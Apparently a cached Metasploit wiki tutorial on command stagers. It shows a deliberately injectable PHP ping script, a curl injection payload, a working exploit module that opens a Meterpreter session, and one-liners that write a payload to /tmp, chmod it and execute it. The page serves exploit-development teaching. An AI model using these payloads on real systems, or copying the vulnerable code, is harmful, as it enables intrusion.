@@ -1,0 +1,357 @@
+I"�o<p>Command stagers provide an easy way to write exploits against typical vulnerabilities such as <a href="https://www.owasp.org/index.php/Command_Injection">command execution</a> or <a href="https://www.owasp.org/index.php/Code_Injection">code injection</a>. There are currently eight different flavors of command stagers, each uses system command (or commands) to save your payload, sometimes decode, and execute.</p>
+
+<h1 id="the-vulnerability-test-case">The Vulnerability Test Case</h1>
+
+<p>The best way to explain how to use a command stager is probably by demonstrating it. Here we have a command injection vulnerability in PHP, something silly you actually might see in an enterprise-level software. The bug is that you can inject additional system commands in the system call for ping:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+   <span class="k">if</span> <span class="p">(</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"ip"</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span>
+      <span class="nv">$output</span> <span class="o">=</span> <span class="nb">system</span><span class="p">(</span><span class="s2">"ping -c 1 "</span> <span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">"ip"</span><span class="p">]);</span>
+      <span class="k">die</span><span class="p">(</span><span class="nv">$output</span><span class="p">);</span>
+   <span class="p">}</span>
+<span class="cp">?&gt;</span>
+
+<span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+  <span class="nt">&lt;form</span> <span class="na">action = </span><span class="s">"ping.php"</span> <span class="na">method = </span><span class="s">"GET"</span><span class="nt">&gt;</span>
+   IP to ping: <span class="nt">&lt;input</span> <span class="na">type = </span><span class="s">"text"</span> <span class="na">name = </span><span class="s">"ip"</span> <span class="nt">/&gt;</span> <span class="nt">&lt;input</span> <span class="na">type = </span><span class="s">"submit"</span> <span class="nt">/&gt;</span>
+  <span class="nt">&lt;/form&gt;</span>
+   <span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<p>Place the above PHP script (ping.php) on an <a href="https://www.digitalocean.com/community/tutorials/how-to-install-linux-apache-mysql-php-lamp-stack-on-ubuntu-14-04">Ubuntu + Apache + PHP</a> server.</p>
+
+<p>Under normal usage, this is how the script behaves - it just pings the host you specify, and shows
+you the output:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ curl "http://192.168.1.203/ping.php?ip=127.0.0.1"
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.017 ms
+
+--- 127.0.0.1 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.017/0.017/0.017/0.000 ms
+rtt min/avg/max/mdev = 0.017/0.017/0.017/0.000 ms
+</code></pre></div></div>
+
+<p>OK, now we can abuse that a little and execute another command (id):</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ curl "http://192.168.1.203/ping.php?ip=127.0.0.1+%26%26+id"
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.020 ms
+
+--- 127.0.0.1 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.020/0.020/0.020/0.000 ms
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre></div></div>
+
+<p>See the www-data? That is the output for the second command we asked the script to execute. By doing that, we can also do something even more nasty - like writing a Meterpreter payload onto the target system, and execute it.</p>
+
+<h1 id="the-msfexploitcmdstager-mixin">The Msf::Exploit::CmdStager Mixin</h1>
+
+<p>Now let’s talk about how to use a command stager to exploit the above script. There are a couple of steps you need to do:</p>
+
+<p><strong>1. Include the Msf::Exploit::CmdStager mixin</strong></p>
+
+<p>Although there are eight flavors of mixins/stagers, you only need to include <a href="https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/cmdstager.rb">Msf::Exploit::CmdStager</a> when writing a Metasploit exploit. The mixin is basically an interface to all eight command stagers:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kp">include</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Exploit</span><span class="o">::</span><span class="no">CmdStager</span>
+</code></pre></div></div>
+
+<p><strong>2. Declare your flavors</strong></p>
+
+<p>To tell Msf::Exploit::CmdStager what flavors you want, you can add the <code class="highlighter-rouge">CmdStagerFlavor</code> info in the module’s metadata. Either from the common level, or the target level. Multiple flavors are allowed.</p>
+
+<p>An example of setting flavors for a specific target:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">'Targets'</span>   <span class="o">=&gt;</span>
+  <span class="p">[</span>
+    <span class="p">[</span> <span class="s1">'Windows'</span><span class="p">,</span>
+      <span class="p">{</span>
+        <span class="s1">'Arch'</span> <span class="o">=&gt;</span> <span class="p">[</span> <span class="no">ARCH_X86_64</span><span class="p">,</span> <span class="no">ARCH_X86</span> <span class="p">],</span>
+        <span class="s1">'Platform'</span> <span class="o">=&gt;</span> <span class="s1">'win'</span><span class="p">,</span>
+        <span class="s1">'CmdStagerFlavor'</span> <span class="o">=&gt;</span> <span class="p">[</span> <span class="s1">'certutil'</span><span class="p">,</span> <span class="s1">'vbs'</span> <span class="p">]</span>
+      <span class="p">}</span>
+    <span class="p">]</span>
+  <span class="p">]</span>
+</code></pre></div></div>
+
+<p>Or, you can pass this info to the execute_cmdstager method (see Call #execute_cmdstager to begin)</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">execute_cmdstager</span><span class="p">(</span><span class="ss">flavor: :vbs</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p><strong>3. Create the execute_command method</strong></p>
+
+<p>You also must create a <code class="highlighter-rouge">def execute_command(cmd, opts = {})</code> method in your module. This is what gets called by the CmdStager mixin when it kicks in. Your objective in this method is to inject whatever is in the <code class="highlighter-rouge">cmd</code> variable to the vulnerable code.</p>
+
+<p><strong>4. Call #execute_cmdstager to begin</strong></p>
+
+<p>And lastly, in your exploit method, call <code class="highlighter-rouge">execute_cmdstager</code> to begin the command stager.</p>
+
+<p>Over the years, we have also learned that these options are quite handy when calling
+execute_cmdstager:</p>
+
+<ul>
+  <li><strong>flavor</strong> - You can specify what command stager (flavor) to use from here. Options are: <code class="highlighter-rouge">:bourne</code>, <code class="highlighter-rouge">:debug_asm</code>, <code class="highlighter-rouge">:debug_write</code>, <code class="highlighter-rouge">:echo</code>, <code class="highlighter-rouge">:printf</code>, <code class="highlighter-rouge">:vbs</code>, <code class="highlighter-rouge">:certutil</code>, <code class="highlighter-rouge">:tftp</code>.</li>
+  <li><strong>delay</strong> - How much time to delay between each command execution. 0.25 is default.</li>
+  <li><strong>linemax</strong> - Maximum number of characters per command. 2047 is default.</li>
+</ul>
+
+<p><strong>Msf::Exploit::CmdStager Template</strong></p>
+
+<p>At the minimum, this is how your exploit should start when you’re using the CmdStager mixin:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">require</span> <span class="s1">'msf/core'</span>
+
+<span class="k">class</span> <span class="nc">MetasploitModule</span> <span class="o">&lt;</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Exploit</span><span class="o">::</span><span class="no">Remote</span>
+
+  <span class="no">Rank</span> <span class="o">=</span> <span class="no">NormalRanking</span>
+
+  <span class="kp">include</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Exploit</span><span class="o">::</span><span class="no">CmdStager</span>
+
+  <span class="k">def</span> <span class="nf">initialize</span><span class="p">(</span><span class="n">info</span><span class="o">=</span><span class="p">{})</span>
+    <span class="k">super</span><span class="p">(</span><span class="n">update_info</span><span class="p">(</span><span class="n">info</span><span class="p">,</span>
+      <span class="s1">'Name'</span>            <span class="o">=&gt;</span> <span class="s2">"Command Injection Using CmdStager"</span><span class="p">,</span>
+      <span class="s1">'Description'</span>     <span class="o">=&gt;</span> <span class="sx">%q{
+        This exploits a command injection using the command stager.
+      }</span><span class="p">,</span>
+      <span class="s1">'License'</span>         <span class="o">=&gt;</span> <span class="no">MSF_LICENSE</span><span class="p">,</span>
+      <span class="s1">'Author'</span>          <span class="o">=&gt;</span> <span class="p">[</span> <span class="s1">'sinn3r'</span> <span class="p">],</span>
+      <span class="s1">'References'</span>      <span class="o">=&gt;</span> <span class="p">[</span> <span class="p">[</span> <span class="s1">'URL'</span><span class="p">,</span> <span class="s1">'http://metasploit.com'</span> <span class="p">]</span> <span class="p">],</span>
+      <span class="s1">'Platform'</span>        <span class="o">=&gt;</span> <span class="s1">'linux'</span><span class="p">,</span>
+      <span class="s1">'Targets'</span>         <span class="o">=&gt;</span> <span class="p">[</span> <span class="p">[</span> <span class="s1">'Linux'</span><span class="p">,</span> <span class="p">{}</span> <span class="p">]</span> <span class="p">],</span>
+      <span class="s1">'Payload'</span>         <span class="o">=&gt;</span> <span class="p">{</span> <span class="s1">'BadChars'</span> <span class="o">=&gt;</span> <span class="s2">"</span><span class="se">\x00</span><span class="s2">"</span> <span class="p">},</span>
+      <span class="s1">'CmdStagerFlavor'</span> <span class="o">=&gt;</span> <span class="p">[</span> <span class="s1">'printf'</span> <span class="p">],</span>
+      <span class="s1">'Privileged'</span>      <span class="o">=&gt;</span> <span class="kp">false</span><span class="p">,</span>
+      <span class="s1">'DisclosureDate'</span>  <span class="o">=&gt;</span> <span class="s2">"Jun 10 2016"</span><span class="p">,</span>
+      <span class="s1">'DefaultTarget'</span>   <span class="o">=&gt;</span> <span class="mi">0</span><span class="p">))</span>
+  <span class="k">end</span>
+
+  <span class="k">def</span> <span class="nf">execute_command</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">opts</span> <span class="o">=</span> <span class="p">{})</span>
+    <span class="c1"># calls some method to inject cmd to the vulnerable code.</span>
+  <span class="k">end</span>
+
+  <span class="k">def</span> <span class="nf">exploit</span>
+    <span class="n">print_status</span><span class="p">(</span><span class="s2">"Exploiting..."</span><span class="p">)</span>
+    <span class="n">execute_cmdstager</span>
+  <span class="k">end</span>
+
+<span class="k">end</span>
+</code></pre></div></div>
+
+<p>As you can see, we have chosen the “printf” flavor as our command stager. We will explain more about
+this later, but basically what it does is it writes our payload to /tmp and execute it.</p>
+
+<p>Now let’s modify the execute_command method and get code execution against the test case. Based on the PoC, we know that our injection string should look like this:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>127.0.0.1+%26%26+[Malicious commands]
+</code></pre></div></div>
+
+<p>We do that in execute_command using <a href="https://github.com/rapid7/metasploit-framework/wiki/How-to-Send-an-HTTP-Request-Using-HTTPClient">HttpClient</a>. Notice there is actually some bad character filtering involved to get the exploit working correctly, which is expected:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">filter_bad_chars</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+  <span class="n">cmd</span><span class="p">.</span><span class="nf">gsub!</span><span class="p">(</span><span class="sr">/chmod \+x/</span><span class="p">,</span> <span class="s1">'chmod 777'</span><span class="p">)</span>
+  <span class="n">cmd</span><span class="p">.</span><span class="nf">gsub!</span><span class="p">(</span><span class="sr">/;/</span><span class="p">,</span> <span class="s1">' %26%26 '</span><span class="p">)</span>
+  <span class="n">cmd</span><span class="p">.</span><span class="nf">gsub!</span><span class="p">(</span><span class="sr">/ /</span><span class="p">,</span> <span class="s1">'+'</span><span class="p">)</span>
+<span class="k">end</span>
+
+<span class="k">def</span> <span class="nf">execute_command</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">opts</span> <span class="o">=</span> <span class="p">{})</span>
+  <span class="n">send_request_cgi</span><span class="p">({</span>
+    <span class="s1">'method'</span>        <span class="o">=&gt;</span> <span class="s1">'GET'</span><span class="p">,</span>
+    <span class="s1">'uri'</span>           <span class="o">=&gt;</span> <span class="s1">'/ping.php'</span><span class="p">,</span>
+    <span class="s1">'encode_params'</span> <span class="o">=&gt;</span> <span class="kp">false</span><span class="p">,</span>
+    <span class="s1">'vars_get'</span>      <span class="o">=&gt;</span> <span class="p">{</span>
+      <span class="s1">'ip'</span> <span class="o">=&gt;</span> <span class="s2">"127.0.0.1+%26%26+</span><span class="si">#{</span><span class="n">filter_bad_chars</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span><span class="si">}</span><span class="s2">"</span>
+    <span class="p">}</span>
+  <span class="p">})</span>
+<span class="k">end</span>
+
+<span class="k">def</span> <span class="nf">exploit</span>
+  <span class="n">print_status</span><span class="p">(</span><span class="s2">"Exploiting..."</span><span class="p">)</span>
+  <span class="n">execute_cmdstager</span>
+<span class="k">end</span>
+</code></pre></div></div>
+
+<p>And let’s run that, we should have a shell:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf exploit(cmdstager_demo) &gt; run
+
+[*] Started reverse TCP handler on 10.6.0.92:4444 
+[*] Exploiting...
+[*] Transmitting intermediate stager for over-sized stage...(105 bytes)
+[*] Sending stage (1495599 bytes) to 10.6.0.92
+[*] Meterpreter session 1 opened (10.6.0.92:4444 -&gt; 10.6.0.92:51522) at 2016-06-10 11:51:03 -0500
+</code></pre></div></div>
+
+<h1 id="flavors">Flavors</h1>
+
+<p>Now that we know how to use the Msf::Exploit::CmdStager mixin, let’s take a look at the command
+stagers you can use.</p>
+
+<h2 id="vbs-command-stager---windows-only">VBS Command Stager - Windows Only</h2>
+
+<p>The <a href="https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/exploitation/cmdstager/vbs.rb">VBS command stager</a> is for Windows. What this does is it encodes our payload with Base64, save it on the target machine, also writes a <a href="https://github.com/rapid7/metasploit-framework/blob/master/data/exploits/cmdstager/vbs_b64">VBS script</a> using the echo command, and then lets the VBS script to decode the Base64 payload, and execute it.</p>
+
+<p>If you are exploiting Windows that supports Powershell, then you might want to <a href="https://github.com/rapid7/metasploit-framework/wiki/How-to-use-Powershell-in-an-exploit">consider using that instead</a> of the VBS stager, because Powershell tends to be more stealthy.</p>
+
+<p>To use the VBS stager, either specify your CmdStagerFlavor in the metadata:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">'CmdStagerFlavor'</span> <span class="o">=&gt;</span> <span class="p">[</span> <span class="s1">'vbs'</span> <span class="p">]</span>
+</code></pre></div></div>
+
+<p>Or set the :vbs key to execute_cmdstager:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">execute_cmdstager</span><span class="p">(</span><span class="ss">flavor: :vbs</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>You will also need to make sure the module’s supported platforms include windows (also in the metadata), example:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">'Platform'</span> <span class="o">=&gt;</span> <span class="s1">'win'</span>
+</code></pre></div></div>
+
+<h2 id="certutil-command-stager---windows-only">Certutil Command Stager - Windows Only</h2>
+
+<p><a href="https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/exploitation/cmdstager/certutil.rb">Certutil</a> is a Windows command that can be used to dump and display certification authority, configuration information, configure certificate services, back and restore CA components, etc. It only comes with newer Windows systems starting from Windows 2012, and Windows 8.</p>
+
+<p>One thing certutil can also do for us is decode the Base64 string from a certificate, and save the decoded content to a file. The following demonstrates:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="nt">-----BEGIN</span> CERTIFICATE----- <span class="o">&gt;</span> encoded.txt
+<span class="nb">echo </span>Just Base64 encode your binary data
+<span class="nb">echo </span><span class="nv">TVoAAA</span><span class="o">==</span> <span class="o">&gt;&gt;</span> encoded.txt
+<span class="nb">echo</span> <span class="nt">-----END</span> CERTIFICATE----- <span class="o">&gt;&gt;</span> encoded.txt
+certutil <span class="nt">-decode</span> encoded.txt decoded.bin
+</code></pre></div></div>
+
+<p>To take advantage of that, the Certutil command stager will save the payload in Base64 as a fake certificate, ask certutil to decode it, and then finally execute it.</p>
+
+<p>To use the Certutil command stager, either specify your CmdStagerFlavor in the metadata:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">'CmdStagerFlavor'</span> <span class="o">=&gt;</span> <span class="p">[</span> <span class="s1">'certutil'</span> <span class="p">]</span>
+</code></pre></div></div>
+
+<p>Or set the :certutil key to execute_cmdstager:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">execute_cmdstager</span><span class="p">(</span><span class="ss">flavor: :certutil</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>You will also need to remember to set the platform in the metadata:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">'Platform'</span> <span class="o">=&gt;</span> <span class="s1">'win'</span>
+</code></pre></div></div>
+
+<h2 id="debug_write-command-stager---windows-only">Debug_write Command Stager - Windows Only</h2>
+
+<p>The <a href="https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/exploitation/cmdstager/debug_write.rb">debug_write</a> command stager is an old Windows trick to write a file to the system. In this case, we use debug.exe to write a small .Net binary, and that binary will take a hex-ascii file created by the echo command, decode the binary, and finally execute.</p>
+
+<p>Obviously, to be able to use this command stager, you must make sure the target is a Windows system that supports .Net.</p>
+
+<p>To use the debug_write command stager, either specify your CmdStagerFlavor in the metadata:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">'CmdStagerFlavor'</span> <span class="o">=&gt;</span> <span class="p">[</span> <span class="s1">'debug_write'</span> <span class="p">]</span>
+</code></pre></div></div>
+
+<p>Or set the :debug_write key to execute_cmdstager:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">execute_cmdstager</span><span class="p">(</span><span class="ss">flavor: :debug_write</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>You will also need to remember to set the platform in the metadata:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">'Platform'</span> <span class="o">=&gt;</span> <span class="s1">'win'</span>
+</code></pre></div></div>
+
+<h2 id="debug_asm-command-stager---windows-only">Debug_asm Command Stager - Windows Only</h2>
+
+<p>The <a href="https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/exploitation/cmdstager/debug_asm.rb">debug_asm</a> command stager is another old Windows trick used to assemble a COM file, and then COM file will decode our hex-ascii payload, and then execute it.</p>
+
+<p>To use the debug_asm command stager, either specify your CmdStagerFlavor in the metadata:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">'CmdStagerFlavor'</span> <span class="o">=&gt;</span> <span class="p">[</span> <span class="s1">'debug_asm'</span> <span class="p">]</span>
+</code></pre></div></div>
+
+<p>Or set the :debug_asm key to execute_cmdstager:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">execute_cmdstager</span><span class="p">(</span><span class="ss">flavor: :debug_asm</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>You will also need to remember to set the platform in the metadata:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">'Platform'</span> <span class="o">=&gt;</span> <span class="s1">'win'</span>
+</code></pre></div></div>
+
+<h2 id="tftp-command-stager---windows-only">TFTP Command Stager - Windows Only</h2>
+
+<p>The <a href="https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/exploitation/cmdstager/tftp.rb">TFTP</a> command stager uses tftpd.exe to download our payload, and then use the start.exe command to execute it. This technique only works well against an older version of Windows (such as XP), because newer Windows machines no longer install tftp.exe by default.</p>
+
+<p>The TFTP command stager must bind to UDP port 69, so msfconsole must be started as root:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rvmsudo ./msfconsole
+</code></pre></div></div>
+
+<p>To use the TFTP stager, either specify your CmdStagerFlavor in the metadata:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">'CmdStagerFlavor'</span> <span class="o">=&gt;</span> <span class="p">[</span> <span class="s1">'tftp'</span> <span class="p">]</span>
+</code></pre></div></div>
+
+<p>Or set the :tftp key to execute_cmdstager:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">execute_cmdstager</span><span class="p">(</span><span class="ss">flavor: :tftp</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>You will also need to remember to set the platform in the metadata:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">'Platform'</span> <span class="o">=&gt;</span> <span class="s1">'win'</span>
+</code></pre></div></div>
+
+<h2 id="bourne-command-stager---multi-platform">Bourne Command Stager - Multi Platform</h2>
+
+<p>The <a href="https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/exploitation/cmdstager/bourne.rb">Bourne</a> command stager supports multiple platforms except for Windows (because the use of the which command that Windows does not have). It functions rather similar to the VBS stager, except when it decodes the Base64 payload at runtime, there are multiple commands to choose from: base64, openssl, python, or perl.</p>
+
+<p>To use the Bourne stager, either specify your CmdStagerFlavor in the metadata:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">'CmdStagerFlavor'</span> <span class="o">=&gt;</span> <span class="p">[</span> <span class="s1">'bourne'</span> <span class="p">]</span>
+</code></pre></div></div>
+
+<p>Or set the :bourne key to execute_cmdstager:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">execute_cmdstager</span><span class="p">(</span><span class="ss">flavor: :bourne</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h2 id="echo-command-stager---multi-platform">Echo Command Stager - Multi Platform</h2>
+
+<p>The <a href="https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/exploitation/cmdstager/echo.rb">echo</a> command stager is suitable for multiple platforms except for Windows. It just <a href="http://manpages.ubuntu.com/manpages/trusty/man1/echo.1fun.html">echos</a> the payload, chmod and execute it. An example of that looks similar to this:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo -en \\x41\\x41\\x41\\x41 &gt;&gt; /tmp/payload ; chmod 777 /tmp/payload ; /tmp/payload ; rm -f /tmp/payload
+</code></pre></div></div>
+
+<p>To use the echo stager, either specify your CmdStagerFlavor in the metadata:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">'CmdStagerFlavor'</span> <span class="o">=&gt;</span> <span class="p">[</span> <span class="s1">'echo'</span> <span class="p">]</span>
+</code></pre></div></div>
+
+<p>Or set the :bourne key to execute_cmdstager:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">execute_cmdstager</span><span class="p">(</span><span class="ss">flavor: :echo</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h2 id="printf-command-stager---multi-platform">Printf Command Stager - Multi Platform</h2>
+
+<p>The <a href="https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/exploitation/cmdstager/printf.rb">printf</a> command stager is also suitable for multiple platforms except for Windows. It just uses the printf command to write the payload to disk, chmod and execute it. An example of that looks similar to this:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>printf '\177\177\177\177' &gt;&gt; /tmp/payload ; chmod +x /tmp/payload ; /tmp/payload ; rm -f /tmp/payload
+</code></pre></div></div>
+
+<p>To use the printf stager, either specify your CmdStagerFlavor in the metadata:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">'CmdStagerFlavor'</span> <span class="o">=&gt;</span> <span class="p">[</span> <span class="s1">'printf'</span> <span class="p">]</span>
+</code></pre></div></div>
+
+<p>Or set the :bourne key to execute_cmdstager:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">execute_cmdstager</span><span class="p">(</span><span class="ss">flavor: :printf</span><span class="p">)</span>
+</code></pre></div></div>
+:ET
